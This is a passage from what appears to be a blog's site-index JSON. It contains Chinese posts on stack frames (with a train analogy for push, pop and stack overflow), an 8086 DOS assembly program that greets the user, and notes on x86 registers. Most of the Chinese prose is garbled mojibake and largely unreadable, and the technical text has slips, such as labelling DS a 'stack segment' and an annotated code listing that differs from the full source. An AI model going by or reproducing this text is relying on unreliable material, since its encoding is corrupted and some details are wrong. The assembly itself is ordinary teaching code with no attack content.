ˆé¡¶æ•°æ®æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿæ²¡é”™ï¼Œæ¯”åŸrbpæ—©ä¸€æ­¥è¢«å‹å…¥çš„ï¼šè¿”å›åœ°å€\nä¸€ä¸ªå…³äºå‡½æ•°è°ƒç”¨çš„æ¯”å–» è°ƒç”¨å­å‡½æ•°çš„å…¨è¿‡ç¨‹ç”±ä»¥ä¸‹å‡ æ¡è¯­å¥ç»„æˆï¼š ï¼ˆè°ƒç”¨è€…å‡½æ•° callerï¼‰ call xxx ï¼ˆè·³è½¬åˆ°è¢«è°ƒç”¨å‡½æ•° calleeï¼‰ push rbp mov rbp, rsp sub rsp, ä»¥ä¸Šå››ä¸ªè¯­å¥å°±æ˜¯æ•´ä¸ªæ ‡å‡†çš„å‡½æ•°è°ƒç”¨æµç¨‹ï¼Œå½“å®Œæˆè¿™ä¸ªæµç¨‹æ—¶ï¼Œæ ˆç©ºé—´å¾€ä½åœ°å€å¢é•¿ã€‚\nå¦‚æœç”¨ä¸€ä¸ªå¾ˆå¥‡æ€ªçš„æ¯”å–»æ¥è§£é‡Šæ ˆçš„å¢é•¿ï¼Œå’Œæ ˆä¸­æ•°æ®çš„rwxï¼Œå°±æ˜¯ä½ é¢å‰æœ‰ä¸€è¾†ç«è½¦ï¼Œç«è½¦å†…çš„ç©ºé—´ä»£è¡¨æ ˆç©ºé—´ï¼Œç«è½¦å†…çš„ä¹˜å®¢ä»£è¡¨æ•°æ®ï¼Œå·¦è¾¹æ˜¯ä½åœ°å€ï¼Œå³è¾¹æ˜¯é«˜åœ°å€ï¼Œä¹˜å®¢åœ¨ç«è½¦é‡Œé¢æ°¸è¿œæ˜¯å…ˆåæ»¡æœ€å·¦è¾¹çš„é‚£ä¸€æ’ï¼Œå†é€æ¸å¾€å³åï¼Œè¿™ä»£è¡¨writeçš„é¡ºåºï¼Œä¹˜åŠ¡å‘˜ç‚¹äººçš„æ—¶å€™ä¹Ÿæ°¸è¿œæ˜¯ä»å·¦è¾¹å¾€å³è¾¹ç‚¹ï¼Œè¿™ä»£è¡¨readçš„é¡ºåº\nè€Œå½“å‘ç”Ÿäº†è°ƒç”¨å­å‡½æ•°çš„äº‹ä»¶æ—¶ï¼Œåˆ—è½¦ç»„äººå‘˜ä¼šå†æ‹‰æ¥ä¸€åˆ—è½¦å¢ï¼Œæ¥åœ¨ç«è½¦çš„æœ€å·¦è¾¹ï¼Œè¿™æ˜¯æ ˆå¾€ä½åœ°å€å¢é•¿ã€‚ç„¶åè¿™ä¸ªæ—¶å€™ä¹˜å®¢è¦ä¸Šè½¦ï¼Œæ˜¯åœ¨é‚£ä¸ªæ–°åŠ ä¸Šå»çš„é‚£èŠ‚è½¦å¢ä»å·¦å¾€å³åã€‚ç«è½¦æ˜¯ä»å³å¾€å·¦åŠ è½¦å¢çš„ï¼Œæ ˆç©ºé—´å¢é•¿å°±æ˜¯åœ¨ä½åœ°å€é‚£è¾¹åŠ äº†èŠ‚è½¦å¢ï¼Œä¹˜å®¢æ°¸è¿œå…ˆåæ•´è¾†ç«è½¦çš„æœ€å·¦è¾¹ã€‚\npushæ˜¯åœ¨æœ€å·¦è¾¹åŠ ä¸€æ’åº§ä½å¹¶ä¸”ä»å¯„å­˜å™¨é‚£é‡Œæªä¸€æ’äººæ‘è¿›å»ï¼Œpopæ˜¯æŠŠé‚£æ’çš„äººæ¨è¿›å¯„å­˜å™¨ç„¶åæ‹†æ‰é‚£æ’åº§ä½ã€‚\npushçš„æ—¶å€™ï¼Œå¯„å­˜å™¨çš„å€¼è¢«å‹å…¥æ ˆï¼Œä½†æ˜¯å¯„å­˜å™¨çš„å€¼æ²¡æœ‰æ”¹å˜ã€‚popçš„æ—¶å€™ï¼Œrspæ‰€æŒ‡ï¼ˆæ ˆé¡¶ï¼‰æ•°æ®è¿›å…¥å¯„å­˜å™¨ï¼Œå¹¶ä¸”rspä¸‹ç§»ï¼Œæ­¤æ—¶è¡¨ç°ä¸ºæ ˆé¡¶æ•°æ®ä»æ ˆä¸­æ¶ˆå¤±ï¼Œä½†æ˜¯é‚£ä¸ªåœ°å€åªæ˜¯ä¸å†ä½äºæ ˆçš„èŒƒå›´äº†ï¼Œé‡Œé¢å­˜å‚¨çš„æ•°æ®æ²¡æœ‰æ”¹å˜ã€‚\nç»§ç»­ä¿®æ”¹ä¸Šé¢çš„å¥‡æ€ªæ¯”å–»çš„è¯ï¼Œé‚£å°±æ˜¯ï¼Œpushçš„æ—¶å€™åŠ äº†æ’åº§ä½ï¼Œå¹¶ä¸”ä»æŒ‡å®šçš„å¯„å­˜å™¨é‚£å¤åˆ¶äº†ä¸€æ’äººæ‘åˆ°äº†åº§ä½ä¸Š;popçš„æ—¶å€™å…ˆæŠŠåŸæ¥æœ€å·¦è¾¹åº§ä½ä¸Šçš„äººå¤åˆ¶ä¸€éæ‹–åˆ°æŒ‡å®šçš„å¯„å­˜å™¨é‚£é‡Œï¼Œå†æŠŠåº§ä½æ‹†æ‰ï¼Œç„¶ååŸæœ¬åœ¨é‚£åçš„äººå°±ç«™ç€äº†ï¼Œä½†æ˜¯ä»–ä»¬â€œä¸å±äºç«è½¦ä¸Šçš„äººäº†â€ã€‚\nå‡½æ•°è¿”å›çš„æ—¶å€™å°±æ˜¯æŠŠé‚£èŠ‚ç°åœ¨ä¸çŸ¥é“å¤šé•¿çš„è½¦å¢æ‹”æ‰ã€‚\nç„¶åå½“æ‹”æ‰ä¸€èŠ‚è½¦å¢æ—¶ï¼Œåªæ˜¯è½¦å¢è¢«æ‹”æ‰äº†ï¼Œäººè¿˜ç«™åœ¨åŸæ¥çš„ä½ç½®ï¼Œç«™åœ¨é“è½¨ä¸Šï¼Œå¦‚æœé‚£é‡ŒåˆåŠ äº†ä¸€èŠ‚è½¦å¢ï¼Œä»–ä»¬å°±åˆ°è½¦å¢é‡Œç»§ç»­ååŸæ¥çš„ä½ç½®ï¼ˆåŠ è½¦å¢å¯¹åº”callå‡½æ•°ï¼ŒåŠ åº§ä½æ˜¯pushï¼‰\né™¤éå‡ºç°ä¾‹å¤–æƒ…å†µï¼šä¾‹å¦‚æ‹†åº§ä½æ‹†åˆ°æœ€å·¦è¾¹æ•´èŠ‚è½¦å¢éƒ½æ‹†ç©ºäº†ï¼Œè¿™æ—¶å€™å¦‚æœç»§ç»­æ‹†ä¼šæ‹†åˆ°ä¸‹ä¸€èŠ‚ï¼Œè¿™æ—¶è¦æ˜¯å†è¿”å›ç¨‹åºä¸€èˆ¬å°±å‡ºé”™äº†ã€‚\nåœ¨è¿™ä¸ªæ¯”å–»çš„åŸºç¡€ä¸Šè§£é‡Šæ ˆæº¢å‡º é‚£å°±æ˜¯ä¹˜å®¢åœ¨æœ€å·¦è¾¹çš„ä¸€èŠ‚è½¦å¢ä¸Šè½¦ï¼Œå´å› ä¸ºè½¦å¢åæ»¡äº†ç›´æ¥ååˆ°äº†è½¦å¢ä¹‹é—´çš„è¿é€šå¤„ï¼Œè¿é€šå¤„å­˜ç€çš„è¿”å›åœ°å€ç›´æ¥ç»™åæ²¡äº†ï¼ˆ\nåœ¨è¿™ä¸ªæ¯”å–»çš„åŸºç¡€ä¸Šè§£é‡Šå±€éƒ¨å˜é‡ ä¹˜å®¢ä¸æ˜¯æ°¸è¿œä»â€œæœ€å·¦è¾¹â€å¼€å§‹åï¼Œè€Œä¸”åŸºæœ¬ä¸ä¼šä»æœ€å·¦è¾¹ï¼ˆrspï¼‰å¼€å§‹ï¼ŒçœŸæ­£å¼€å§‹åçš„ä½ç½®æ˜¯å±€éƒ¨å˜é‡çš„ä½ç½®\nå½“å‡½æ•°ä¸­å£°æ˜å±€éƒ¨å˜é‡æ—¶ï¼Œç¼–è¯‘å™¨å°±ç¡®å®šäº†è¯¥å˜é‡ç›¸å¯¹äºrbpçš„åç§»é‡ï¼Œç›¸å½“äºåœ¨è½¦å¢æŸä¸ªä½ç½®ç”»äº†æ¡çº¿ï¼Œå†™ä¸Šé‚£ä¸ªå˜é‡çš„åå­— å½“æœ‰getsä¸€ç±»è¯»å–è¾“å…¥çš„æ—¶å€™ï¼Œç¼–è¯‘å™¨ä¼šä¸ºå…¶é¢„ç•™â€œåº§ä½â€ ä¸ç®¡æ€æ ·ï¼Œå˜é‡ï¼ˆä¹˜å®¢ï¼‰æ€»æ˜¯ä»ä½åˆ°é«˜ï¼ˆä»å·¦åˆ°å³ï¼‰å†™å…¥ï¼ˆå…¥åº§ï¼‰çš„ æ€»ç»“ ","date":"2022å¹´10æœˆ26æ—¥","permalink":"https://peterliuzhi.top/principle/%E5%85%B3%E4%BA%8E%E6%A0%88%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/","section":"principle","summary":"When we feel love and kindness toward others, it not only makes others feel loved and cared for, but it helps us also to develop inner happiness and peace. â€” Dalai Lama pwndbgä¸­æ˜¾ç¤ºçš„æ ˆ æœ€ä¸Šæ–¹çš„rsp rbpæ ˆå¸§æŒ‡é’ˆ æ ˆçš„é«˜ä½åŒºåˆ« CALLå‡½æ•° ä¸€ä¸ªå…³äºå‡½æ•°","tags":["pwn","æ ˆ"],"title":"å…³äºæ ˆçš„ä¸€äº›åŸºç¡€çŸ¥è¯†"},{"categories":["tricks"],"contents":" Prejudice is a burden that confuses the past, threatens the future and renders the present inaccessible. â€” Maya Angelou\nä¸€ä¸ªéå¸¸ç®€æ˜“çš„å‘ç”¨æˆ·è¯»å–è¾“å…¥å§“åï¼Œå°†å…¶æ˜¾ç¤ºåœ¨å±å¹•ä¸Šï¼ŒåŒæ—¶ç”¨hello worldå‘å…¶é—®å€™çš„ç¨‹åºåœ¨Cè¯­è¨€ä¸­æå…¶ç®€ä¾¿ï¼Œä½†æ˜¯åœ¨æ±‡ç¼–ä¸­æˆ‘ä»¬ä¸å¾—ä¸å»æ‰‹åŠ¨å®‰æ’æ ˆæ®µä¸æ•°æ®æ®µï¼Œæˆ‘ä»¬è¿˜å¾—æ—¶åˆ»æ³¨æ„æ ˆçš„å˜åŒ–ï¼Œé˜²æ­¢ä»å‡½æ•°è¿”å›æ—¶æ— æ³•è¿”å›åˆ°æ­£ç¡®çš„ä½ç½®\næºä»£ç  assume cs:code, ds:data, ss:stack data segment StringToPrint db \u0026#34;Hello World!\u0026#34;, 13, 10, \u0026#34;$\u0026#34; StringForRead db \u0026#34;Please Input Your Name:\u0026#34;, \u0026#34;$\u0026#34; Input db 0ah, 20 dup(\u0026#34;$\u0026#34;) data ends stack segment db 128 dup (0) stack ends code segment start: mov ax, data mov ds, ax mov ax, stack mov ss, ax mov sp, 128 mov bp, sp mov ax, offset StringForRead push ax call read mov ax, offset StringToPrint push ax call puts mov ah,4ch int 21h puts: pop si pop dx push si push bp mov bp, sp mov ah, 09h int 21h mov sp, bp pop bp ret read: pop si pop ax push si push bp mov bp, sp push ax call puts mov di, offset Input + 1 mov bx, 17 get: mov cx, bx jcxz ok mov ah, 01h int 21h mov ch, 0 mov cl, al sub cl, 0dh jcxz ok mov ds:[di], al inc di dec bx jmp get ok: show: mov al, \u0026#34;,\u0026#34; mov ds:[di], al mov ax, offset INPUT push ax call puts mov sp, bp pop bp ret code ends end start è¾“å‡ºç»“æœï¼š\nåˆ†æ åœ¨æ•°æ®æ®µä¸­æˆ‘ä»¬å®šä¹‰äº†æˆ‘ä»¬éœ€è¦ç”¨åˆ°çš„å„ç§æ•°æ®ï¼ŒåŒæ—¶è¿˜æœ‰ä¸€æ®µå›ºå®šé•¿åº¦ç”¨äºä¿å­˜å§“åçš„ç©ºé—´ï¼ˆåœ¨å®é™…ä¸Šçš„Cç¨‹åºä¸­ï¼Œå±€éƒ¨å˜é‡æ˜¯æ”¾åœ¨æ ˆä¸­çš„ï¼Œé€šè¿‡å°†rspå‡ä¸€å®šçš„å€¼ï¼Œåœ¨rbpå’Œrspä¹‹é—´ç©ºå‡ºä¸€æ®µç©ºé—´æ¥å­˜å‚¨å˜é‡ï¼‰\ndata segment StringToPrint db \u0026#34;Hello World!\u0026#34;, 13, 10, \u0026#34;$\u0026#34; StringForRead db \u0026#34;Please Input Your Name:\u0026#34;, \u0026#34;$\u0026#34; Input db 0ah, 20 dup(\u0026#34;$\u0026#34;) ;ç”¨æ¥ä¿å­˜è¾“å…¥ data ends stack segment db 128 dup (0) ;æ ˆçš„æ€»å¤§å°ä¸º128ä¸ªå­—èŠ‚ stack ends ç„¶åæˆ‘ä»¬å®šä¹‰äº†ç±»ä¼¼Cè¯­è¨€ä¸­çš„mainå‡½æ•°ï¼š\nstart: mov ax, data mov ds, ax mov ax, stack mov ss, ax mov sp, 128 mov bp, sp ;å¤‡ä»½sp mov ax, offset StringForRead ï¼›å°†éœ€è¦çš„æ•°æ®å…¥æ ˆ push ax call read ;è°ƒç”¨readå‡½æ•° mov ax, offset StringToPrint push ax mov bp, sp call puts mov ah,4ch int 21h ç„¶åæˆ‘ä»¬å»å®ç°è¿™ä¸¤ä¸ªå‡½æ•°\nPUTS:\nputs: pop si ;callçš„æ—¶å€™ä¼šå°†ä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€è¿›æ ˆ pop dx ;å–å‡ºå‚æ•° ;å®é™…ä¸Š64ä½ç³»ç»Ÿçš„å‚æ•°ä¿å­˜è‡³å¯„å­˜å™¨ä¸­ï¼Œ ;è€Œ32ä½ç³»ç»Ÿçš„å‚æ•°ä¿å­˜åœ¨æ ˆä¸­ï¼Œ ;è¯¦æƒ…è§å‰é¢çš„ç¬”è®° push si ;é‡æ–°è¿›æ ˆè®©retæŒ‡ä»¤èƒ½å¤Ÿè¿”å› push bp ;å¤‡ä»½bp mov bp, sp ;å¤‡ä»½sp mov ah, 09h ;09hå‘Šè¯‰dosç³»ç»Ÿæ‰“å°ä¸€ä¸ªå­—ç¬¦ä¸² int 21h ;æ‰“å° mov sp, bp ;æ¢å¤spçš„å€¼ pop bp ;æ¢å¤bpçš„å€¼ ;è¿™ä¸¤å¥è¯ç›¸å½“äºleaveæŒ‡ä»¤ ret ;ç›¸å½“äºpop rip ;è¿”å›callçš„ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ READ:\nread: pop si pop ax ;å–å‡ºå‚æ•° push si push bp ;å¤‡ä»½ mov bp, sp push ax ;è¦è°ƒç”¨å‡½æ•°çš„è¯è¿˜è¦å°†å‚æ•°è¿›æ ˆ ;è¿™é‡Œå¦‚æœä¸å…ˆå‡ºæ ˆå†è¿›æ ˆ ;é‚£ä¹ˆå‚æ•°ä¼šå˜æˆcallä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€ call puts mov di, offset Input + 1 ;è¶Šè¿‡å¼€å¤´çš„æ¢è¡Œç¬¦ mov bx, 17 ;é€šè¿‡bxæ§åˆ¶æœ€å¤šèƒ½è¾“å…¥çš„å­—ç¬¦æ•° ;ï¼ˆå»æ‰å‰åä¸¤ä¸ªæ¢è¡Œç¬¦ï¼Œç»ˆæ­¢ç¬¦ï¼‰ get: mov cx, bx ;å°†bxçš„å€¼ä¼ ç»™cx jcxz ok ;å¦‚æœcx=0å°±è·³åˆ°ok ;ç›¸å½“äºå¦‚æœbx=0å°±è·³å‡º mov ah, 01h ;01hä»£è¡¨è¯»å–å•ä¸ªå­—ç¬¦ int 21h mov ch, 0 ;å°†cxé«˜ä½è®¾ä¸º0 mov cl, al sub cl, 0dh ;å¦‚æœè¾“å…¥å›è½¦ç¬¦cxå°±ä¸º0 jcxz ok ;æ‰€ä»¥è¾“å…¥å›è½¦å°±ç»“æŸ mov ds:[di], al ;å°†å­—ç¬¦ä¿å­˜åœ¨å˜é‡ç©ºé—´ä¸­ inc di ;ç›¸å½“äºå¢åŠ æ•°ç»„æŒ‡é’ˆ dec bx ;å‡å°‘bxï¼Œç›´è‡³0 jmp get ;ç»§ç»­è¯»å–è¾“å…¥ ok: show: mov al, \u0026#34;,\u0026#34; ;åœ¨åå­—ååŠ é€—å· mov ds:[di], al mov ax, offset INPUT push ax ;å°†è¦putsæ‰“å°çš„å­—ç¬¦ä¸²åœ°å€å…¥æ ˆ call puts mov sp, bp ;æ¢å¤sp pop bp ;æ¢å¤bp ret ;è¿”å› ","date":"2022å¹´10æœˆ26æ—¥","permalink":"https://peterliuzhi.top/tricks/%E6%B1%87%E7%BC%96%E7%89%88hello-world/","section":"tricks","summary":"Prejudice is a burden that confuses the past, threatens the future and renders the present inaccessible. â€” Maya Angelou ä¸€ä¸ªéå¸¸ç®€æ˜“çš„å‘ç”¨æˆ·è¯»å–è¾“å…¥å§“åï¼Œå°†å…¶æ˜¾ç¤ºåœ¨å±å¹•ä¸Šï¼ŒåŒæ—¶ç”¨hello worldå‘å…¶é—®å€™çš„ç¨‹åºåœ¨Cè¯­è¨€ä¸­æå…¶ç®€ä¾¿ï¼Œ","tags":["pwn"],"title":"æ±‡ç¼–ç‰ˆhello world"},{"categories":["principle"],"contents":" Kindness is the language which the deaf can hear and the blind can see. â€” Mark Twain\næ±‡ç¼–ä¸å¯„å­˜å™¨ å¯„å­˜å™¨ åœ¨16ä½ç³»ç»Ÿä¸­ï¼ˆ8086CPUï¼‰ æ•°æ®å¯„å­˜å™¨ å˜å€å¯„å­˜å™¨ æŒ‡é’ˆå¯„å­˜å™¨ æ®µå¯„å­˜å™¨ æŒ‡é’ˆæŒ‡ä»¤å¯„å­˜å™¨ åœ¨32ä½ç³»ç»Ÿä¸­ï¼ˆi386ï¼‰ åœ¨64ä½ç³»ç»Ÿä¸­ï¼ˆamd64ï¼‰ æ±‡ç¼– ç³»ç»Ÿå¦‚ä½•æ‰§è¡Œæ±‡ç¼–ä»£ç  å°†å¯¹åº”æŒ‡é’ˆå¯„å­˜å™¨æŒ‡å‘å¯¹åº”æ®µ ä»£ç  æ ˆ æ•°æ® PUSHæŒ‡ä»¤å’ŒPOPæŒ‡ä»¤ å¯„å­˜å™¨ åœ¨16ä½ç³»ç»Ÿä¸­ï¼ˆ8086CPUï¼‰ æ•°æ®å¯„å­˜å™¨ ç”¨äºæš‚å­˜æ•°æ®çš„å¯„å­˜å™¨æœ‰AXã€BXã€CXã€DXï¼Œè¿™äº›å¯„å­˜å™¨å¯ä»¥èµ·åˆ°æš‚å­˜16ä½çš„æ•°æ®çš„ä½œç”¨ã€‚æ¯ä¸€ä¸ªåˆå¯ä»¥åˆ†æˆé«˜å…«ä½å’Œä½å…«ä½ï¼Œå¦‚AXå¯„å­˜å™¨ï¼Œé«˜å…«ä½ä¸ºAHï¼Œä½å…«ä½ä¸ºALï¼Œå°†è¶…å‡ºå…«ä½çš„æ•°æ®å­˜å…¥AHæˆ–ALä¸ä¼šè‡ªåŠ¨å°†æ•°æ®å¡«å…¥AXçš„å‰©ä¸‹ç©ºé—´ï¼Œè€Œæ˜¯ä¼šæº¢å‡ºï¼Œäº§ç”Ÿæ•°æ®ä¸¢å¤±\nå¯„å­˜å™¨AXå’ŒALé€šå¸¸ç§°ä¸ºç´¯åŠ å™¨(Accumulator)ï¼Œç”¨ç´¯åŠ å™¨è¿›è¡Œçš„åŠ å‡ä¹˜é™¤è€—æ—¶æ›´å°‘ å¯„å­˜å™¨BXç§°ä¸ºåŸºåœ°å€å¯„å­˜å™¨(Base Register)ï¼Œå¯ä½œä¸ºå­˜å‚¨å™¨æŒ‡é’ˆæ¥ä½¿ç”¨ å¯„å­˜å™¨CXç§°ä¸ºè®¡æ•°å¯„å­˜å™¨(Count Register)ã€‚åœ¨å¾ªç¯å’Œå­—ç¬¦ä¸²æ“ä½œæ—¶ï¼Œè¦ç”¨å®ƒæ¥æ§åˆ¶å¾ªç¯æ¬¡æ•°ï¼ˆå¾ªç¯çš„æ¬¡æ•°ä¿å­˜åœ¨CXä¸­ï¼Œæ¯å¾ªç¯ä¸€æ¬¡CXå°±å‡ä¸€ï¼Œç›´è‡³0å¾ªç¯åœæ­¢ï¼‰ å¯„å­˜å™¨DXç§°ä¸ºæ•°æ®å¯„å­˜å™¨(Data Register)ã€‚åœ¨è¿›è¡Œä¹˜ã€é™¤è¿ç®—æ—¶ï¼Œå®ƒå¯ä½œä¸ºé»˜è®¤çš„æ“ä½œæ•°å‚ä¸è¿ç®—ï¼Œä¹Ÿå¯ç”¨äºå­˜æ”¾I/Oçš„ç«¯å£åœ°å€ å˜å€å¯„å­˜å™¨ SIå’ŒDIç§°ä¸ºå˜å€å¯„å­˜å™¨ï¼Œç”¨äºå­˜æ”¾å­˜å‚¨å•å…ƒåœ¨æ®µå†…çš„åç§»é‡ï¼ŒSIå‚¨å­˜æºåœ°å€ï¼ˆsource indexï¼‰ï¼ŒDIå‚¨å­˜ç›®çš„åœ°å€ï¼ˆdestination indexï¼‰\næŒ‡é’ˆå¯„å­˜å™¨ BPã€SPç§°ä¸ºæŒ‡é’ˆå¯„å­˜å™¨ï¼ŒSPæ˜¯å †æ ˆæŒ‡é’ˆï¼ˆstack pointerï¼‰ï¼Œå­˜æ”¾æ ˆé¡¶åœ°å€ï¼›BPæ˜¯åŸºå€æŒ‡é’ˆï¼ˆbase pointerï¼‰ï¼Œå­˜æ”¾å †æ ˆåŸºå€åç§»ï¼Œç›¸å½“äºä¸ºæœ€å¼€å§‹çš„SPåšå¤‡ä»½ï¼ˆè§ä¸ŠèŠ‚RBPå’ŒRSPçš„è®²è§£ï¼‰\næ®µå¯„å­˜å™¨ CSã€DSã€SSã€ESè¢«ç§°ä¸ºæ®µå¯„å­˜å™¨ï¼Œç”¨äºå‚¨å­˜æ®µåœ°å€ï¼Œéœ€è¦å’Œåç§»é‡ä¸€èµ·ä½¿ç”¨æ‰èƒ½æŸ¥æ‰¾åˆ°å†…å­˜ä¸­çš„æ•°æ®ã€‚\nCSä¸ºä»£ç æ®µï¼ˆcode segmentï¼‰ï¼Œå’ŒIPå¯„å­˜å™¨ä¸€èµ·ä½¿ç”¨ï¼Œç”¨äºç¡®å®šä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ DSä¸ºæ•°æ®æ®µï¼ˆstack segmentï¼‰ï¼Œç”¨äºå­˜å‚¨æ•°æ®æ‰€åœ¨çš„æ®µåœ°å€ï¼Œå’Œè¯¸å¦‚[0]ä¸€ç±»çš„è¡¨è¾¾ä¸€èµ·ä½¿ç”¨ï¼Œå¦‚æœæ²¡æœ‰ç‰¹åˆ«è¯´æ˜ï¼Œ[0]==DS:[0] SSä¸ºå †æ ˆæ®µï¼ˆstack segmentï¼‰ï¼Œå’ŒSPå¯„å­˜å™¨ä¸€èµ·ä½¿ç”¨ï¼Œç”¨äºç¡®å®šå †æ ˆçš„ä½ç½®ï¼Œé•¿æœŸæŒ‡å‘æ ˆé¡¶ ESä¸ºæ‰©å±•æ®µ(extend segment)ï¼Œä¸ºæ‰©å±•çš„æ®µå¯„å­˜å™¨ æŒ‡é’ˆæŒ‡ä»¤å¯„å­˜å™¨ IPè¢«ç§°ä½œæŒ‡é’ˆæŒ‡ä»¤å¯„å­˜å™¨ï¼Œå‚¨å­˜ç›¸å¯¹äºæ®µå¯„å­˜å™¨CSçš„åç§»é‡ï¼Œåœ¨å†…å­˜ä¸­æ‰¾åˆ°CS:IPå¤„çš„æŒ‡ä»¤å¹¶æ‰§è¡Œ\nåœ¨32ä½ç³»ç»Ÿä¸­ï¼ˆi386ï¼‰ åœ¨AXã€BXã€CXã€DXç­‰å‰é¢åŠ Eï¼Œå˜æˆäº†EAXã€EBXã€ECXã€EDXç­‰ï¼Œè€ŒåŸæœ¬çš„AXã€BXã€CXã€DXç­‰æˆä¸ºäº†å…¶ä½16ä½ï¼Œè€Œå­˜å–å®ƒçš„é«˜åå…­ä½å¯ä»¥é€šè¿‡ç§»ä½æ“ä½œè¿›è¡Œï¼ˆå‘å·¦ç§»16ä½ï¼‰ï¼Œæˆ–è€…é€šè¿‡bswap EAXè¿›è¡Œï¼ˆäº¤æ¢EAXçš„é«˜ã€ä½ä½ï¼‰\nåœ¨16ä½CPUä¸­ï¼ŒAXã€BXã€CXå’ŒDXä¸èƒ½ä½œä¸ºåŸºå€å’Œå˜å€å¯„å­˜å™¨æ¥å­˜æ”¾å­˜å‚¨å•å…ƒçš„åœ°å€ï¼Œä½†åœ¨32ä½CPUä¸­ï¼Œå…¶32ä½å¯„å­˜å™¨EAXã€EBXã€ECXå’ŒEDXä¸ä»…å¯ä¼ é€æ•°æ®ã€æš‚å­˜æ•°æ®ä¿å­˜ç®—æœ¯é€»è¾‘è¿ç®—ç»“æœï¼Œè€Œä¸”ä¹Ÿå¯ä½œä¸ºæŒ‡é’ˆå¯„å­˜å™¨ï¼Œæ‰€ä»¥ï¼Œè¿™äº›32ä½å¯„å­˜å™¨æ›´å…·æœ‰é€šç”¨æ€§\nåœ¨64ä½ç³»ç»Ÿä¸­ï¼ˆamd64ï¼‰ å°†32ä½ä¸­çš„Eå‰ç¼€æ”¹ä¸ºäº†Rå‰ç¼€ï¼Œè€ŒåŸæœ¬32ä½ä¸­çš„åç§°ç”¨æ¥ä»£æŒ‡64ä½ä¸­å¯„å­˜å™¨çš„ä½ä½ï¼ŒåŒæ—¶64ä½ç³»ç»Ÿå¢åŠ äº†8ä¸ªé€šç”¨å¯„å­˜å™¨ï¼Œå‘½åä¸ºR8~R15ï¼Œåœ¨å…¶ååŠ ä¸Šdï¼Œwï¼ŒbæŒ‡å®šé•¿åº¦ï¼ˆdæœ€é•¿ï¼Œbæœ€çŸ­ï¼‰\nå› æ­¤64ä½ç³»ç»Ÿä¸­çš„å¯„å­˜å™¨æ¯”32ä½è¦å¤š8ä¸ª\nâœ¨ 32ä½ç³»ç»Ÿä¸­ï¼Œå‡½æ•°çš„ä¼ é€’å‚æ•°ä¿å­˜åœ¨æ ˆå¸§ä¸­ï¼Œè€Œ64ä½ç³»ç»Ÿä¿å­˜åœ¨å¯„å­˜å™¨ä¸­ï¼Œåˆ†åˆ«ç”¨RDI,RSI,RDX,RCX,R8,R9ä½œä¸ºç¬¬1-6ä¸ªå‚æ•°ï¼Œç”¨RAXä¿å­˜è¿”å›å€¼\næ±‡ç¼– ç³»ç»Ÿå¦‚ä½•æ‰§è¡Œæ±‡ç¼–ä»£ç  å½“æˆ‘ä»¬æ‰§è¡Œä¸€ä¸ªexeæ–‡ä»¶æ—¶ï¼Œç³»ç»Ÿä¼šå°†è¿™ä¸ªexeæ–‡ä»¶è½½å…¥å†…å­˜ï¼Œå¹¶ä¸”å°†ï¼ˆR\\Eï¼‰CS:ï¼ˆR\\Eï¼‰IPæŒ‡å‘è¿™å—å†…å­˜çš„æœ€ä½åœ°å€ï¼Œæ¯æ‰§è¡Œä¸€å¥IPå°±è‡ªåŠ¨å¢åŠ ï¼ˆé•¿åº¦ä¸å›ºå®šï¼‰ï¼Œè€Œæ‰€è¦æ‰§è¡Œçš„è¿™ä¸€æ®µä»£ç åœ¨æ±‡ç¼–å†…ç§°ä¸ºä»£ç æ®µã€‚\nåŒæ—¶ï¼Œexeæ–‡ä»¶è¿˜ä¼šæœ‰å®ƒçš„æ ˆæ®µå’Œæ•°æ®æ®µï¼Œè¿™ä¸¤æ®µåœ°å€åœ¨å†…å­˜ä¸­ç”¨æ±‡ç¼–æŒ‡ä»¤dw(define word)å£°æ˜ï¼Œdw 0å°±æ˜¯å£°æ˜ä¸€ä¸ªä¸º0çš„å­—ï¼ˆä¸¤ä¸ªå­—èŠ‚ï¼‰ï¼Œdw 0,0å°±æ˜¯å£°æ˜ä¸¤ä¸ªå­—\ndata segment dw 0123h, 0456h, 0789h, 0abch, 0defh, 0fedh, 0cbah, 0987h data ends stack segment dw 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 stack ends å°†å¯¹åº”æŒ‡é’ˆå¯„å­˜å™¨æŒ‡å‘å¯¹åº”æ®µ æˆ‘ä»¬çš„æ ˆã€æ•°æ®ã€ä»£ç åœ¨å“ªé‡Œå®Œå…¨å–å†³äºå¯¹åº”çš„æ®µå¯„å­˜å™¨å’ŒæŒ‡é’ˆå¯„å­˜å™¨ã€æŒ‡é’ˆæŒ‡ä»¤å¯„å­˜å™¨æŒ‡å‘å“ªé‡Œ\nå› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦æ”¹å˜å¯¹åº”å¯„å­˜å™¨çš„å€¼\nä»£ç  æˆ‘ä»¬éœ€è¦è®¾ç½®CS:IPï¼Œä½¿å…¶æŒ‡å‘ä»£ç è¢«è½½å…¥çš„å†…å­˜å¤„\nåœ¨æ±‡ç¼–ä¸­ï¼Œåªéœ€è¦åœ¨éœ€è¦æ‰§è¡Œçš„ä»£ç å‰åŠ ä¸Šstart:ï¼Œæœ€åend startå³å¯\ncode segment start: mov ax, stack mov ss, ax mov sp, 100h ;åˆå§‹åŒ–æ ˆæŒ‡é’ˆ mov ax, data mov ds,ax ;åˆå§‹åŒ–å†…å­˜æŒ‡é’ˆ code ends end start æ ˆ éœ€è¦å°†SSæŒ‡å‘æ ˆæ®µï¼Œå¹¶è®¾ç½®SPæŒ‡å‘æ ˆåº•ï¼ˆä¸€å¼€å§‹æ ˆä¸ºç©ºï¼‰\nmov ax, stack mov ss, ax mov sp, 100h ;åˆå§‹åŒ–æ ˆæŒ‡é’ˆ æ•°æ® å°†DSæŒ‡å‘æ•°æ®æ®µï¼Œå°±å¯ä»¥ç”¨[0]å¼çš„è¡¨è¾¾å¼å­˜å–æ•°æ®äº†\nmov ax, data mov ds,ax ;åˆå§‹åŒ–å†…å­˜æŒ‡é’ˆ PUSHæŒ‡ä»¤å’ŒPOPæŒ‡ä»¤ 